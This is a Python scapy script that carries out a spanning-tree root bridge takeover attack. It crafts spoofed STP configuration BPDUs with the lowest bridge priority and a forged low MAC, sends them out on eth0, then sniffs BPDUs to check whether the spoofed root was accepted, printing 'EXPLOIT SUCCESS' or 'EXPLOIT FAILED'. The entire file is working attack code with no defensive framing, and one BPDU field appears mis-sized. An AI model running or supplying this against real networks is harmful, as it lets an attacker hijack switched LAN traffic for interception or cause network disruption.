from scapy.all import *
from scapy.layers.l2 import Dot3, LLC, Ether, sendp
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, ShortField, LongField, MACField, FieldLenField
from datetime import datetime

STP_TYPE = 0x0000  # config BPDU
BRIDGE_PRIORITY = 0x0000  # set the priority to the lowest value to become the most preferred bridge
ROOT_MAC = "00:00:00:00:00:01"  # spoof my mac address as low and set this variable to be that mac
BRIDGE_MAC = "00:00:00:00:00:01"  # spoof my mac address as low and set this variable to be that mac
SPOOFED_ROOT_MAC = "00:00:00:00:00:01" # again set this to the spoofed root mac address you want to use

# def the stp packet
class STP(Packet):
    name = "STP"
    fields_desc = [
        ByteField("protocol_id", 0),
        ByteField("version", 0),  
        ByteField("bpdu_type", 0), 
        ByteField("flags", 0),
        ShortField("root_priority", BRIDGE_PRIORITY),
        MACField("root_mac", ROOT_MAC),
        LongField("root_path_cost", 0),
        ShortField("bridge_priority", BRIDGE_PRIORITY),
        MACField("bridge_mac", BRIDGE_MAC),
        ShortField("port_id", 0x8001),
        ShortField("message_age", 1),
        ShortField("max_age", 20),
        ShortField("hello_time", 2),
        ShortField("forward_delay", 15)
    ]

# bind to the LLC layer
bind_layers(LLC, STP, dsap=0x42, ssap=0x42)

# build out the packet (Ethernet > 802.2 LLC > STP)
pkt = (
    Ether(dst="01:80:C2:00:00:00", src=BRIDGE_MAC) / # destination MAC address is the STP multicast address
    LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
    STP()
)

# send the packet
sendp(pkt, iface="eth0", count=10, inter=1)

def capture_bpdus():
    print("[*] Listening for BPDUs to validate...")
    success = False # false by default
    def handler(pkt): # when there is a packet pass it
        nonlocal success
        if pkt.haslayer(STP): # if it is part of the STP layer print out its info
            root_mac = pkt[STP].root_mac
            bridge_mac = pkt[STP].bridge_mac
            print(f"\n[!] BPDU received at {datetime.now().strftime('%H:%M:%S')}")
            print(f"    Root MAC:    {root_mac}")
            print(f"    Bridge MAC:  {bridge_mac}")
            print(f"    Root Prio:   {pkt[STP].root_priority}")
            print(f"    Bridge Prio: {pkt[STP].bridge_priority}")

            # check if the root mac that is recieved is the same as our spoofed mac
            if root_mac.lower() == SPOOFED_ROOT_MAC.lower():
                success = True #if it is then say we succeeded

    sniff(iface="eth0", prn=handler, timeout=10) # send sniff packet

	# let user know the results
    if success:
        print("\n EXPLOIT SUCCESS! \n")
    else:
        print("\n EXPLOIT FAILED! \n")

capture_bpdus()